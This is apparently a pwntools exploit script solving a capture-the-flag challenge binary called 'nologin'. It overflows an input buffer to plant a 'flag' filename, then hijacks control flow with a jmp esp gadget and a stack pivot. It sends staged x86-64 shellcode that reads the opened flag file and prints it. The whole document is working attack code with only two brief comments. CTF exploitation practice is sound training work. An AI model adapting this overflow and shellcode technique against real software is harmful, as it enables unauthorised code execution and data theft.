from pwn import *

context(os='linux',arch='amd64')
context.log_level=True

local = 1
binary = './nologin'
port = '11000'

if local == 1:
	io = process(binary)
else:
	io = remote("192.168.39.184",port)

io.recvuntil('input>> \n')
io.sendline('1')
io.recvuntil('user1>> \n')
io.sendline('5')
payload = 'a'*(0x30-0x19-0x4)+'flag'
print(payload)
io.sendline(payload)
io.recvuntil('>> \n')
io.sendline('4')
io.recvuntil('input file name:\n')
io.sendline('\x00')
io.recvuntil('>> \n')
io.sendline('6')
io.recvuntil('input>> \n')
io.sendline('2')
io.recvuntil('>password: ')
#gdb.attach(io,"b *0x400a0e")
jmp_esp=0x00000000004016fb
shellcode='mov eax,0;mov edx,200;syscall'
#用jmp esp劫持控制流到栈上
payload=asm(shellcode).ljust(0xd,'a')+p64(jmp_esp)+asm('mov bx,21;sub rsp,rbx;jmp rsp')
print(len(payload))
io.send(payload)
# pause()
shellcode='mov edx,200;mov rdi,3;mov rax,0;syscall;mov rdi,1;mov rax,1;syscall;'
print(len(shellcode))
#加上0x30是填充之前的指令，因为当前的ip指向0x30这个位置
payload='c'*0x30+asm(shellcode)
# pause()
io.send(payload)
io.interactive()